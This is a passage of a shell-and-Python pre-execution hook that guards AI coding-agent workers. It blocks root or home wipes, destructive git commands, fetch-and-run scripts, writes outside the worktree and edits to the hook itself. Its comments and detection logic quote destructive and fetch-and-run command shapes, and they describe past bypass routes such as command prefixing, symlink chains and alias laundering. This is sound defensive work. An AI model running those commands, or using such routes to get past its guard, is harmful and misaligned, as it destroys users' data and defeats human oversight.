            return True   # equals / inside / contains a guard directory, wherever it resolves
    return False


def _within(path, top):
    """True when path is top or sits under it; top `/` holds every absolute path."""
    return path == top or path.startswith(top.rstrip("/") + "/")


def _guard_dirs_resolved():
    """Every guard directory and the directory holding every guard file, as the root spells it
    and with its symlinks followed, so one resolving outside the worktree is still a guard."""
    out = set()
    for rel in _GUARD_DIRS_REL:
        lexical = os.path.join(_GROOT, rel)
        out.update((lexical, os.path.realpath(lexical)))
    for g in [os.path.join(_GROOT, x) for x in GUARD_SAMPLES] + sorted(_GSELF):
        out.add(os.path.dirname(os.path.realpath(g)))
    return {p.rstrip("/") or "/" for p in out}


def _extracts_over_guard(ws):
    """A reason when ws extracts an archive (tar/bsdtar/gtar -x, unzip, cpio -i, pax -r, patch)
    into a directory that covers the guard region, else None. The members are not visible, so
    this asks rather than denies (W1-05; Codex g1 r2 P1 widened the destinations and tools)."""
    if not ws:
        return None
    head, rest = _peel_busybox(ws[0].rsplit("/", 1)[-1], ws[1:])
    letters = "".join(w[1:] for w in rest if re.fullmatch(r"-[A-Za-z]+", w))
    longs = [w.split("=", 1)[0] for w in rest if w.startswith("--")]

    def dest_of(shorts, longnames):
        # The operand of -C/-d/-D (per `shorts`) or --directory[=], separate or glued.
        for i, w in enumerate(rest):
            if w in longnames and i + 1 < len(rest):
                return rest[i + 1]
            for ln in longnames:
                if w.startswith(ln + "="):
                    return w.split("=", 1)[1]
            if shorts and re.fullmatch(r"-[%s]" % shorts, w) and i + 1 < len(rest):
                return rest[i + 1]
            if shorts and re.fullmatch(r"-[%s].+" % shorts, w):
                return w[2:]
        return None

    _DIR_LONGS = ("--directory", "--cd", "--chdir")
    if head in ("tar", "bsdtar", "gtar"):
        tletters, tlongs, _f, tdest = _tar_info(rest)   # reads the dashless bundle too (g1 P1)
        if not ("x" in tletters or any(x in tlongs for x in ("extract", "get"))):
            return None
        dest = tdest
    elif head == "unzip":
        dest = dest_of("d", ())
    elif head in ("cpio", "pax") and ("i" in letters or "r" in letters
                                      or "--extract" in longs or "--read" in longs):
        if head == "pax" and ("w" in letters or "--write" in longs):
            return None   # pax -r -w copies between trees, not an extract into a dir
        dest = dest_of("Cd", _DIR_LONGS)
    elif head == "patch":
        dest = dest_of("d", _DIR_LONGS)
        if any(w in ("-o", "--output") or w.startswith("--output=") for w in rest):
            return None   # -o FILE is a named write, judged by the self-guard instead
    else:
        return None
    if _dest_covers_guard(dest):
        return ("Extracting an archive or applying a patch into a directory that holds the hook "
                "guard. Its member names are not visible to this hook, so it cannot prove the "
                "guard files are untouched; extract into a subdirectory or name the targets.")
    return None


def _rooty(tok):
    """"root" or "home" when a delete target denotes all of / or all of $HOME at the CLASS level,
    else None (W1-06). The HIGH tier matched a literal spelling set, so `/*/`, `~/.`, `~/*`,
    `${HOME}/*` and `${HOME}/.` were a root/home wipe downgraded to a never-list ask. Here `.` and
    `..` collapse, a single trailing glob segment (*, ?, [) is "everything directly here", and
    ~, $HOME and ${HOME} are the home root -- so the class is judged, not the spelling."""
    if not tok:
        return None
    m = re.match(r"\$\{HOME\}|\$HOME(?![A-Za-z0-9_])", tok)
    if tok == "~" or tok.startswith("~/"):
        base, body = "home", tok[1:]
    elif m:
        base, body = "home", tok[m.end():]
    elif tok.startswith("/"):
        base, body = "root", tok
    else:
        return None
    segs = []
    for s in body.split("/"):
        if s in ("", "."):
            continue
        if s == "..":
            if segs:
                segs.pop()
            elif base == "home":
                return None   # the parent of $HOME is not the home class
            continue   # above / stays /
        segs.append("*" if any(ch in s for ch in "*?[") else s)
    if not segs:
        return base
    return base if segs == ["*"] else None


def _root_wipe(ws):
    """True when ws is a recursive rm whose every target is root/home-class (W1-06)."""
    if not ws or ws[0].rsplit("/", 1)[-1] != "rm":
        return False
    rest = ws[1:]
    recursive = any(re.fullmatch(r"-[A-Za-z]*[rR][A-Za-z]*", w) or w == "--recursive"
                    for w in rest if w.startswith("-"))
    targets = _operands(rest)
    return bool(recursive and targets and all(_rooty(t) for t in targets))


# File-write redirect operators (NOT the fd-duplication ops): a numeric target is a filename
# for these, while for >& / <& a number is a descriptor (Codex g1 P1).
_FILE_WRITE_OPS = (">", ">>", ">|", "&>", "&>>", "<>")


def _has_write(text, depth=0):
    """True when text performs a file write the hook can see -- a redirect to a file (not an fd
    dup like 2>&1), or a tee -- anywhere, descending shell/-c bodies. The ro tier write floor
    (W4-05) reads this, so a write hidden in a shell -c body is caught too. A body is descended
    through _expand, so a program the body feeds a shell (sh -c "echo CMD | sh") is judged as
    well; text this reader cannot split counts as a write (fail closed)."""
    try:
        segs = _split(text)
    except ValueError:
        return True
    for _j, seg in segs:
        try:
            words, redirs = _redirs(seg)
        except ValueError:
            return True
        for _fd, op, target in redirs:
            if not target:
                continue
            if op in _FILE_WRITE_OPS:
                return True                       # `> 123` / `> -` writes a file named 123 / -
            if op == ">&" and target != "-" and not target.isdigit():
                return True                       # `>&out` writes a file; `>&1`/`>&-` is an fd op
        ws = _command_words(words)
        if not ws:
            continue
        if ws[0].rsplit("/", 1)[-1] == "tee" and _operands(ws[1:]):
            return True
        if depth < 4:
            body = _inner_body(ws)
            if body:
                try:
                    parts = _expand(body)[0]
                except ValueError:
                    return True
                if any(_has_write(part, depth + 1) for part in parts):
                    return True
    return False


def _never_git(ws):
    """Why a git command discards local work or history beyond easy recovery, or None (P2-12)."""
    if not ws or ws[0].rsplit("/", 1)[-1] != "git":
        return None
    sub = _git_sub(ws[1:])
    if not sub:
        return None
    verb, rest, letters, longs = sub[0], sub[1:], "", []
    for w in rest:
        if w == "--":
            break
        if w.startswith("--"):
            longs.append(w)
        elif w.startswith("-") and len(w) > 1:
            letters += w[1:]

    def has_long(*names):
        return any(_long_is(w, names) for w in longs)

    force = "f" in letters or has_long("force")
    whole = any(w in _WHOLE_TREE for w in rest)
    if verb == "branch" and (force or any(flag in letters for flag in "DMC")):
        return "Force-deleting, force-renaming or resetting a local branch."
    if verb == "update-ref" and ("d" in letters or has_long("delete")):
        return "Deleting a ref outright."
    if verb == "reflog" and sub[1:2] in (["expire"], ["delete"]):
        return "Expiring reflog entries, the record that makes discarded commits recoverable."
    if verb == "stash" and sub[1:2] in (["drop"], ["clear"]):
        return "Dropping stashed work."
    if verb in ("filter-repo", "filter-branch"):
        return "Rewriting repository history."
    if verb == "worktree" and sub[1:2] == ["remove"] and force:
        return "Force-removing a worktree and its uncommitted work."
    if verb == "reset" and has_long("hard"):
        return "Discarding uncommitted work."
    if verb in ("checkout", "switch") and (force or has_long("discard-changes")):
        return "Discarding every local change."
    if verb == "checkout" and whole:
        return "Discarding every local change."
    if verb == "restore" and whole and ("W" in letters or has_long("worktree")
                                        or not ("S" in letters or has_long("staged"))):
        return "Discarding every local change."
    if verb == "clean" and force and not ("n" in letters or has_long("dry-run")):
        specs = _git_clean_pathspecs(rest)
        if not specs or any(sp in _WHOLE_TREE or sp.startswith(":") or any(ch in sp for ch in "*?[")
                            for sp in specs):
            return "Deleting every untracked file in the tree."
    return None


_RUNNERS = ("sh", "bash", "zsh", "dash", "ksh", "mksh", "ash", "yash", "posh", "fish", "csh",
            "tcsh", "source", ".", "eval", "perl", "ruby", "node", "nodejs", "deno", "bun", "php",
            "pwsh")


def _code_words(ws):
    """The words a runner executes as code: a -c/-e string, else its script operand."""
    head = ws[0].rsplit("/", 1)[-1] if ws else ""
    if not (head in _RUNNERS or _canon_interp(head) in ("python", "perl", "ruby", "php")):
        return None
    if head in ("eval", "source", "."):
        return ws[1:]
    body = _inner_body(ws)
    if body is not None:
        return [body]
    codes = _inline_code(head, ws[1:])
    if codes:
        return codes
    ops = [w for w in ws[1:] if not w.startswith("-")]
    return ops[:1]


def _fetch_runs():
    """A remote script fetched and run in one command, past what the line regex sees (§5)."""
    fetch_sub = False
    for sub in _subs:
        try:
            heads = [_command_words(_tokenize(seg)[0])[:1] for _j, seg in _split(sub)]
        except ValueError:
            heads = [[w] for w in sub.split()[:1]]
        fetch_sub = fetch_sub or any(h and h[0].rsplit("/", 1)[-1] in _FETCH_ARG for h in heads)
    # echo "$(curl …)" | sh: a substitution piped into a shell that runs its stdin (#598).
    if fetch_sub and _FED_SUB:
        return True
    fetched = set()
    for ws, writes, seg in _all_views:
        if not ws:
            continue
        head = ws[0].rsplit("/", 1)[-1]
        if head in _FETCH_ARG:
            fetched |= {os.path.basename(p) for p in _fetch_outputs(head, ws[1:]) + writes}
            continue
        code = _code_words(ws)
        # sh <(curl …), bash -c "$(curl …)", `eval` of "$(wget -O- …)", python3 < <(curl …)
        if fetch_sub and code is not None and (any(_SUB_MARK in w for w in code)
                                               or re.search(r"<{1,3}[ \t]*\x22?" + _SUB_MARK, seg)):
            return True
        # curl -o f URL && sh f, wget URL/install.sh; bash install.sh, curl -O … && ./x.sh
        if fetched and ((code is not None and any(os.path.basename(w) in fetched for w in code))
                        or ("/" in ws[0] and head in fetched)):
            return True
    return False


_never = [why for why in (_never_git(_vw) for _vw, _w, _sg in _all_views) if why]
_never += [why for why in (_extracts_over_guard(_vw) for _vw, _w, _sg in _all_views) if why]
if _fetch_runs():
    _never.append("Running a script fetched from the network in the same command.")
if _never:
    record("N", _never[0])
_hard = [why for why in (_alias_refusal(_vw) for _vw, _w, _sg in _all_views) if why]
_hard += [why for why in (_awk_program_file(_vw) for _vw, _w, _sg in _all_views) if why]
_hard += [why for why in (_git_alias_laundering(_all_assigns[_k], _vw)
                          for _k, (_vw, _w, _sg) in enumerate(_all_views)) if why]
if _BRACE_REFUSAL:
    _hard.insert(0, _BRACE_REFUSAL)
if _hard:
    record("D", _hard[0])
# Y: a recursive rm whose every target is the root or home CLASS (W1-06), judged by the HIGH tier.
if any(_root_wipe(_vw) for _vw, _w, _sg in _all_views):
    record("Y", "1")

# R: the line the as-written never-list pass reads (#598, from #602). That pass ran over the raw
# text so curl … | sh still read as a pipe, and so it ASKED about a never-list shape that was
# only quoted as data: git commit -m "explain why rm -rf / is refused", echo "rm -rf /". R keeps
# every segment and its real operator, but drops what only carries text -- echo and printf
# arguments, a git -m or gh --body/--title operand -- and reads a body (sh -c, eval, trap, a
# fed program …) the same way. Anything that runs is judged by the C records regardless.
_DATA_HEADS = ("echo", "printf", ":", "true", "false")
_MESSAGE_OPTS = {"git": ("m", ("--message",)), "gh": ("bt", ("--body", "--title"))}


def _data_dropped(ws):
    head = ws[0].rsplit("/", 1)[-1] if ws else ""
    if head in _DATA_HEADS:
        return ws[:1]
    letters, longs = _MESSAGE_OPTS.get(head, ("", ()))
    if not letters:
        return ws
    out, skip = [], False
    for w in ws:
        if skip:
            skip = False
        elif w.startswith("--") and w.split("=", 1)[0] in longs:
            out.append(w.split("=", 1)[0])
            skip = "=" not in w
        elif re.fullmatch(r"-[A-Za-z]*[%s]" % letters, w):
            out.append(w)
            skip = True
        elif len(w) > 2 and not w.startswith("--") and w[:2] in ["-" + x for x in letters]:
            out.append(w[:2])   # the text glued to its option
        else:
            out.append(w)
    return out


def _rline(text, depth=0):
    out = []
    for join, seg in _split(text):
        try:
            words = _command_words(_tokenize(seg)[0])
        except ValueError:
            words = seg.split()
        body = _inner_body(words) if depth < 3 and words else None
        if body is not None:
            try:
                lines = chr(10).join(_expand(body)[0])   # heredoc data out, live text in
            except ValueError:
                lines = body   # a body this reader cannot split is read as written
            words = words[:1] + [_rline(lines, depth + 1)]
        else:
            words = _data_dropped(words)
        sep = {"|": " | ", "&&": " && "}.get(join, " ; ") if out else ""
        out.append(sep + " ".join(words))
    return "".join(out).replace(_QNL, " ").replace(chr(10), " ").replace(chr(13), " ")


record("R", "=" + _rline(_judged))
# Z: the ro write floor (W4-05), recorded LAST so the extra reads it makes move no other record.
# "write": a file write the hook can see in any command the line runs -- the surface, every
# substitution, every program fed to a shell or interpreter (_parts) and every -c body inside
# them. "blind": a shell reads a program on stdin that the hook cannot read (_FED_BLIND), so a
# write inside it would be unseen.
if any(_has_write(_part) for _part in _parts):
    record("Z", "write")
elif _FED_BLIND:
    record("Z", "blind")
'
FIELDS=$(printf '%s' "$PAYLOAD" | { printf '%s' "$_READER" | python3 -I - 3<&4 4<&- 2>/dev/null; } 4<&0) || {
  # Exit 2 UNCONDITIONALLY: OpenHands and jcode fail OPEN on exit 1 and on an
  # exit-0 reply they cannot attribute, and Claude Code reads exit 2 as block.
  HOOK_STRICT=1
  decide deny "deny-hook: the tool payload is empty or could not be parsed. Fail-closed: an unreadable payload is refused, never allowed."
  exit 2
}

# Every record reader below, and has() in the tiers, leans on grep, sed and tr. A missing or
# broken one read as "no match" or an empty segment, and every rule failed OPEN (2026-10-23
# review, section 5). Probe them once; a tool that cannot answer refuses, exit 2 as above.
if ! printf 'probe\n' | grep -qE '^pro(be)$' 2>/dev/null \
  || [ "$(printf 'a\nb\n' | sed -n '2p' 2>/dev/null)" != "b" ] \
  || [ "$(printf 'a  b' | tr -s '[:space:]' ' ' 2>/dev/null)" != "a b" ]; then
  HOOK_STRICT=1
  decide deny "deny-hook: grep, sed or tr is missing or broken, so no rule can be matched. Fail-closed."
  exit 2
fi

# Rule 5 verdict, computed in the payload reader (the only place the joining
# operators survive): an E record means an off-repo write in this command has
# no egress receipt immediately &&-preceding it.
# S: the payload names a non-Claude tool, so this host is judged STRICT (see header).
if printf '%s\n' "$FIELDS" | sed -n '4,$p' | grep -q '^S '; then HOOK_STRICT=1; fi

# G: a write or removal aimed at the worker's own guard (self-guard, see header).
# Judged before the boundary for file tools, after the HIGH tier for shells (so a
# root delete keeps its own, more specific refusal).
guard_check() {
  _GUARD_HIT=$(printf '%s\n' "$FIELDS" | sed -n '4,$s/^G //p' | sed -n '1p')
  if [ -n "$_GUARD_HIT" ]; then
    decide deny "deny-hook[HIGH]: '$_GUARD_HIT' is part of this worker's own guard (a hook config, a pinned trust anchor under .orca/, or deny-hook.sh itself). A worker never edits, overwrites or removes the hook that bounds it; ask the coordinator to change the wiring."
    exit 0
  fi
}

if printf '%s\n' "$FIELDS" | grep -q '^E '; then
  decide deny "deny-hook[HIGH]: off-repo write without its egress receipt. Precede the send in the same command — egress.py write … && <this gh command> — so what left the machine is on the hash-chained record (merge-serialization.md, #368). The receipt comes first: the send may be the last thing this process does. One receipt covers exactly one send, and only on the success path (&&)."
  exit 0
fi

# D: a refusal the payload reader judged with a reason of its own (#598): a gh alias that hides
# an off-repo write, or an alias file whose expansions are unreadable.
_HARD=$(printf '%s\n' "$FIELDS" | sed -n '4,$s/^D //p' | sed -n '1p')
if [ -n "$_HARD" ]; then
  decide deny "deny-hook[HIGH]: $_HARD"
  exit 0
fi

# --- path resolution ---------------------------------------------------------
# The boundary check is a string prefix, so the path it compares has to be a
# REAL absolute path. It previously was not: when a write named a parent that
# did not exist yet, the fallback pasted the raw (un-normalized) parent onto
# $PWD, so `../outside/new/file` became `/worktree/../outside/new` — which
# prefix-matches `/worktree/` and was ALLOWED while the write landed outside
# (PR #277 review, P2).
#
# lexical_abs collapses `.` and `..` with no filesystem access, so it is safe on
# a tail that does not exist yet. resolve_dir resolves the deepest EXISTING
# ancestor physically first (that is what catches symlinks, which a lexical pass
# cannot), then collapses the remaining tail against it — components that do not
# exist cannot be symlinks, so collapsing them lexically is sound.
lexical_abs() {
  _p=$1
  case "$_p" in /*) : ;; *) _p="$(pwd -P)/$_p" ;; esac
  _out=""
  _oldifs=$IFS
  IFS='/'
  # A segment is a NAME, never a pattern: with globbing on, a `.?` or `q*` segment matched
  # entries of the HOOK's cwd (`.?` matches `..`), so the answer moved with that cwd (W4-09).
  set -f
  for _seg in $_p; do
    case "$_seg" in
      ''|.) : ;;
      ..) _out=${_out%/*} ;;
      *) _out="$_out/$_seg" ;;
    esac
  done
  set +f
  IFS=$_oldifs
  printf '%s' "${_out:-/}"
}

resolve_dir() {
  _d=$1
  [ -n "$_d" ] || return 0
  case "$_d" in /*) : ;; *) _d="$(pwd -P)/$_d" ;; esac
  _tail=""
  while [ ! -d "$_d" ]; do
    _parent=$(dirname -- "$_d")
    [ "$_parent" = "$_d" ] && break
    _tail="$(basename -- "$_d")${_tail:+/}$_tail"
    _d=$_parent
  done
  _real=$(cd "$_d" 2>/dev/null && pwd -P) || _real=$_d
  [ -n "$_tail" ] && _real="$_real/$_tail"
  lexical_abs "$_real"
}

# resolve_target sets RESOLVED to the physical directory the final component of
# $1 actually lives in, following the WHOLE symlink chain. Resolving a single hop
# denied `wt/link -> /outside/f` and allowed `wt/a -> wt/b -> /outside/f` — the
# same escape with one more link in it, and the attacker picks the number of
# links (#297). Bounded, so a cycle cannot spin here; exhausting the bound is a
# refusal, not a pass. It sets a global rather than printing one because a
# command substitution would run the refusal below in a subshell, where `exit`
# exits the substitution and the hook carries on to allow.
resolve_target() {
  _base=$(basename -- "$1")
  RESOLVED=$(resolve_dir "$(dirname -- "$1")")
  _hops=0
  while [ -n "$RESOLVED" ] && [ -L "$RESOLVED/$_base" ]; do
    _hops=$((_hops + 1))
    if [ "$_hops" -gt 32 ]; then
      decide deny "deny-hook: the write target is a symlink chain over 32 links deep, or a cycle. Fail-closed."
      exit 0
    fi
    _tgt=$(readlink "$RESOLVED/$_base" 2>/dev/null || printf '')
    [ -n "$_tgt" ] || break
    case "$_tgt" in
      /*) RESOLVED=$(resolve_dir "$(dirname -- "$_tgt")") ;;
      *)  RESOLVED=$(resolve_dir "$RESOLVED/$(dirname -- "$_tgt")") ;;
    esac
    _base=$(basename -- "$_tgt")
  done
}

TOOL=$(printf '%s\n' "$FIELDS" | sed -n '1p')
CMD=$(printf '%s\n' "$FIELDS" | sed -n '2p')
FILE=$(printf '%s\n' "$FIELDS" | sed -n '3p')

# The unit boundary, resolved once; empty when neither OPEN_FLEET_UNIT_WORKTREE
# nor its legacy alias ORCA_UNIT_WORKTREE is set.
BOUND=""
if [ -n "${UNIT_WORKTREE:-}" ]; then
  BOUND=$(cd "$UNIT_WORKTREE" 2>/dev/null && pwd -P) || BOUND=""
  if [ -z "$BOUND" ]; then
    decide deny "deny-hook: ORCA_UNIT_WORKTREE is set but does not resolve to a directory. Fail-closed."
    exit 0
  fi
fi

# Judged by where the final component actually points, not by its own name.
check_edit_target() {
  [ -n "$BOUND" ] || return 0
  resolve_target "$1"
  REAL=$RESOLVED
  if [ -z "$REAL" ]; then
    decide deny "deny-hook: the write target could not be resolved to an absolute path. Fail-closed."
    exit 0
  fi
  case "$REAL/" in
    "$BOUND"/*) return 0 ;;
    *) decide deny "deny-hook: this worker may only write inside its own worktree. The target resolves outside the unit boundary."
       exit 0 ;;
  esac
}

# File-touch recording (#590): the line range each allowed edit touches, the path
# RELATIVE to the unit worktree, so two workers' edits of one repo-relative file
# meet in the store. A conflict is surfaced — a stderr warning and an escalation
# to the coordinator — never a block: the merge gate owns that decision.
# local_state.py is found beside this hook (runtime/scripts/ → repo root) or via
# OPEN_FLEET_ROOT. Errors are reported on stderr and never change the decision.
# Payload and fields travel through a private temp dir, not argv: one argv string is capped at
# 128 KiB on Linux, and a large Write would silently go unrecorded.
record_touches() {
  [ -n "${OPEN_FLEET_STATE_DB:-${ORCA_FLEET_STATE_DB:-}}" ] || return 0
  _td=$(mktemp -d 2>/dev/null) || { echo "deny-hook: NOTE file touch not recorded: no temp dir" >&2; return 0; }
  printf '%s' "$PAYLOAD" > "$_td/payload"
  printf '%s' "$FIELDS" > "$_td/fields"
  python3 -I - "$DH_SELF" "$TOOL" "$_td" <<'PYTOUCH' || true
import json, os, re, sys
from pathlib import Path

WHOLE = (1, 999999)


def main():
    db_path = os.environ.get("OPEN_FLEET_STATE_DB") or os.environ.get("ORCA_FLEET_STATE_DB")
    if not db_path:
        return
    self_path, tool, scratch = sys.argv[1], sys.argv[2], sys.argv[3]
    with open(os.path.join(scratch, "fields"), encoding="utf-8", errors="replace") as fh:
        fields = fh.read()
    roots = [Path(self_path).resolve().parent.parent.parent]
    # OPEN_FLEET_ROOT, else the pre-rename ORCA_FLEET_ROOT installed users still export.
    fleet_root = os.environ.get("OPEN_FLEET_ROOT") or os.environ.get("ORCA_FLEET_ROOT")
    if fleet_root:
        roots.append(Path(fleet_root).expanduser().resolve())
    root = next((r for r in roots if (r / "runtime" / "providers" / "local_state.py").is_file()), None)
    if root is None:
        print("deny-hook: NOTE file touch not recorded: runtime/providers/local_state.py not "
              "found beside the hook or under OPEN_FLEET_ROOT (or ORCA_FLEET_ROOT)", file=sys.stderr)
        return
    if str(root) not in sys.path:
        sys.path.insert(0, str(root))
    from runtime.providers.local_state import LocalStateStore

    try:
        with open(os.path.join(scratch, "payload"), encoding="utf-8", errors="replace") as fh:
            doc = json.loads(fh.read() or "{}")
    except ValueError:
        doc = {}
    doc = doc if isinstance(doc, dict) else {}
    ti = doc.get("tool_input")
    if isinstance(ti, str):
        try:
            ti = json.loads(ti)
        except ValueError:
            ti = {"patch": ti}
    if not isinstance(ti, dict):
        ti = doc if os.environ.get("JCODE_HOOK_TOOL_NAME") and "tool_name" not in doc else (
            doc.get("input") if isinstance(doc.get("input"), dict) else {})

    lines = fields.split("\n")
    if tool == "Bash":
        paths = [ln[2:] for ln in lines[3:] if ln.startswith("P ")]
    else:
        paths = [lines[2] if len(lines) > 2 else ""] + [ln[2:] for ln in lines[3:] if ln.startswith("F ")]
    paths = [p for p in paths if p]
    if not paths:
        return

    wt = os.environ.get("OPEN_FLEET_UNIT_WORKTREE") or os.environ.get("ORCA_UNIT_WORKTREE") or ""
    wt_real = os.path.realpath(wt) if wt else ""

    def rel(p):
        ap = os.path.realpath(os.path.join(os.getcwd(), os.path.expanduser(p)))
        if wt_real and (ap == wt_real or ap.startswith(wt_real + os.sep)):
            return os.path.relpath(ap, wt_real)
        return ap

    def read(p):
        try:
            with open(os.path.join(os.getcwd(), os.path.expanduser(p)), encoding="utf-8",
                      errors="replace") as fh:
                return fh.read(8 * 1024 * 1024)
        except OSError:
            return None

    def locate(p, chunk):
        text = read(p)
        if not chunk or text is None:
            return None
        idx = text.find(chunk)
        if idx < 0:
            return None
        start = text.count("\n", 0, idx) + 1
        return (start, start + chunk.count("\n"))

    ranges = {}

    def add(p, rng):
        ranges.setdefault(rel(p), []).append(rng or WHOLE)

    top = next((ti.get(k) for k in ("file_path", "path", "filePath", "notebook_path")
                if isinstance(ti.get(k), str) and ti.get(k)), "")
    old_keys = ("old_string", "old_str", "oldString", "oldText", "old_text")
    old = next((ti.get(k) for k in old_keys if isinstance(ti.get(k), str)), None)
    if top and old is not None:
        add(top, locate(top, old))
    if top and isinstance(ti.get("insert_line"), int):
        add(top, (max(1, ti["insert_line"]), ti["insert_line"] + 1))
    for ed in ti.get("edits") or []:
        if not isinstance(ed, dict):
            continue
        ep = next((ed.get(k) for k in ("file_path", "path", "filePath")
                   if isinstance(ed.get(k), str) and ed.get(k)), top)
        eo = next((ed.get(k) for k in old_keys if isinstance(ed.get(k), str)), None)
        if ep:
            add(ep, locate(ep, eo) if eo is not None else None)

    blobs = [v for v in ti.values() if isinstance(v, str)]
    if isinstance(doc.get("patch"), str):
        blobs.append(doc["patch"])
    for blob in blobs:
        if "*** Begin Patch" in blob or re.search(r"(?m)^(\+\+\+ |@@ -\d)", blob):
            patch_ranges(blob, add, locate)

    op = tool.lower()
    worker_id = (os.environ.get("OPEN_FLEET_WORKER_ID") or os.environ.get("ORCA_WORKER_ID")
                 or os.environ.get("OPEN_FLEET_DISPATCH_ID") or os.environ.get("ORCA_DISPATCH_ID")
                 or os.environ.get("OPEN_FLEET_TERMINAL_HANDLE") or os.environ.get("ORCA_TERMINAL_HANDLE")
                 # No identity exported: the worktree IS the worker, so two workers still differ.
                 or (f"wt:{wt_real}" if wt_real else "worker"))
    run_id = os.environ.get("OPEN_FLEET_RUN_ID") or os.environ.get("ORCA_RUN_ID") or "default"
    store = LocalStateStore(db_path)
    conflicts, seen = [], set()
    for p in paths:
        key = rel(p)
        for start, end in ranges.get(key) or [WHOLE]:
            if (key, start, end) in seen:
                continue
            seen.add((key, start, end))
            res = store.record_file_touch(worker_id=worker_id, file_path=key, start_line=start,
                                          end_line=end, op=op, run_id=run_id)
            if res.get("conflict"):
                conflicts.extend(res.get("conflicts") or [])
    if not conflicts:
        return
    for c in conflicts:
        print(f"deny-hook: WARNING file-touch conflict: {c.get('file')} lines "
              f"{c.get('lines')} overlaps {c.get('otherWorker')} lines {c.get('otherLines')} "
              "(escalated to the coordinator; the edit is not blocked)", file=sys.stderr)
    try:
        store.send_message(subject=f"file-touch conflict on {conflicts[0].get('file')}",
                           msg_type="escalation", to="coordinator", sender=worker_id, run=run_id,
                           payload=json.dumps(conflicts), attrs={"fileTouchConflict": conflicts})
    except Exception as err:  # the warning above already surfaced it
        print(f"deny-hook: NOTE conflict escalation not sent: {err}", file=sys.stderr)


def patch_ranges(blob, add, locate):
    """Line ranges per file: unified hunk headers give them; Codex hunks are located."""
    cur, mode, old, minus = None, None, [], None

    def flush():
        if cur and mode == "update" and old:
            add(cur, locate(cur, "\n".join(old)))
        old.clear()

    for ln in blob.splitlines():
        m = re.match(r"^\*\*\* (Add|Update|Delete) File:\s*(.+)$", ln)
        if m:
            flush()
            cur, mode = m.group(2).strip(), m.group(1).lower()
            if mode != "update":
                add(cur, None)
            continue
        m = re.match(r"^\*\*\* Move to:\s*(.+)$", ln)
        if m:
            add(m.group(1).strip(), None)
            continue
        if ln.startswith("*** "):
            flush()
            continue
        m = re.match(r"^--- (?:a/)?([^\t\r\n]+)", ln)
        if m and mode != "update":
            minus = m.group(1).strip()
            continue
        m = re.match(r"^\+\+\+ (?:b/)?([^\t\r\n]+)", ln)
        if m and mode != "update":
            name = m.group(1).strip()
            cur, mode = (minus if name == "/dev/null" else name), "unified"
            if name == "/dev/null" or minus == "/dev/null":
                add(cur, None)
            continue
        if mode == "unified":
            m = re.match(r"^@@ -(\d+)(?:,(\d+))? \+\d+(?:,\d+)? @@", ln)
            if m and cur and cur != "/dev/null":
                a, b = int(m.group(1)), int(m.group(2) if m.group(2) is not None else 1)
                add(cur, (max(1, a), max(1, a) + max(b, 1) - 1))
            continue
        if mode == "update":
            if ln.startswith("@@"):
                flush()
            elif ln[:1] in (" ", "-"):
                old.append(ln[1:])
            elif ln == "":
                old.append("")
    flush()


try:
    main()
except Exception as err:
    print(f"deny-hook: NOTE file touch not recorded: {err}", file=sys.stderr)
PYTOUCH
  rm -rf "$_td"
}

case "$TOOL" in
  Edit|Write|NotebookEdit|MultiEdit)
    [ -n "$FILE" ] || exit 0
    guard_check
    if [ "$HOOK_READONLY" = "1" ]; then
      decide deny "deny-hook[READONLY]: this worker runs read-only (ro tier) and may not edit, write or create files. Run it under the rw tier if it needs to change the tree."
      exit 0
    fi
    if [ -n "$BOUND" ]; then
      check_edit_target "$FILE"
      while IFS= read -r _FREC; do
        case "$_FREC" in
          'F '*) check_edit_target "${_FREC#F }" ;;
        esac
      done <<EOF
$(printf '%s\n' "$FIELDS" | sed -n '4,$p')
EOF
    fi
    record_touches
    exit 0
    ;;
  Bash) : ;;
  *) exit 0 ;;
esac

# `apply_patch <<EOF` inside a shell command: its file headers are writes, judged
# exactly as the apply_patch tool's are (#577).
HAS_PATCH=0
while IFS= read -r _PREC; do
  case "$_PREC" in
    'P '*) HAS_PATCH=1; check_edit_target "${_PREC#P }" ;;
  esac
done <<EOF
$(printf '%s\n' "$FIELDS" | sed -n '4,$p')
EOF

[ -n "$CMD" ] || exit 0

# --- HIGH tier (deny) --------------------------------------------------------
# Each SEGMENT of the command line is judged on its own. This block used to run only when the
# command contained no ';', '&&', '||' or '|', and the header claimed a compound command "falls
# through to the Never-list ask". It did not — it was ALLOWED, silently. `cd /x && rm
# --no-preserve-root -rf /` and `env FOO=1 rm --no-preserve-root -rf /` both passed, so putting
# anything at all in front of a refused command defeated the entire tier (#297).
#
# This is still string matching and still cannot resolve what a command DOES: a segment whose
# target comes from a variable or a subshell is beyond it, and the Never list below is the net for
# those. What it buys is that the refused shapes are refused wherever they sit.
#
# The split IS quote-aware (see `segments` in the payload reader), so `git commit -m "oops; rm -rf
# /"` is one segment naming `git commit`, and `rm -rf "/;x"` is one segment whose only target is a
# file literally called `/;x`. An earlier cut split on the raw text and argued that was safe
# because splitting only ever makes MORE segments. It is not: the split leaves the rest of the
# quoted value glued to the FRONT of the next segment, and every rule here is anchored at `^`.
FULL_CMD=$CMD
# grep exits 1 for no match, 2 on an error, 127 when it is missing. Only 1 is "no match": the
# rest used to read as one too, so a broken matcher passed every rule (2026-10-23 review, §5).
has() {
  printf '%s' "$CMD" | grep -qE "$1" 2>/dev/null && return 0
  _has_rc=$?
  [ "$_has_rc" -eq 1 ] && return 1
  HOOK_STRICT=1
  decide deny "deny-hook: grep failed (exit $_has_rc) while matching the command. Fail-closed."
  exit 2
}

# Canonicalise the executable spelling of the FIRST word: an absolute or
# relative path, a leading backslash, or surrounding quotes name the same
# command as the bare word. Every rule below anchors on bare names (`rm`,
# `git`, `tee`), so `/bin/rm -rf /` and `/usr/bin/git push --force` walked
# past rules that denied the bare spellings (full-review probe). An
# assignment word is never touched — its VALUE may contain slashes
# (`FOO=/a/b git …`) and basename-cutting it would eat the prefix run.
canon_first() {
  _cf=$1
  case "$_cf" in \\*) _cf=${_cf#\\} ;; esac
  _t=${_cf%% *}
  case "$_t" in
    [A-Za-z_]*=*) printf '%s' "$_cf"; return ;;
    */*|\\*|\"*|\'*) : ;;
    *) printf '%s' "$_cf"; return ;;
  esac
  _u=$_t
  _u=${_u#\\}; _u=${_u#\"}; _u=${_u%\"}; _u=${_u#\'}; _u=${_u%\'}
  _b=${_u##*/}
  [ -n "$_b" ] || { printf '%s' "$_cf"; return; }
  case "$_cf" in
    *\ *) printf '%s %s' "$_b" "${_cf#* }" ;;
    *)    printf '%s' "$_b" ;;
  esac
}

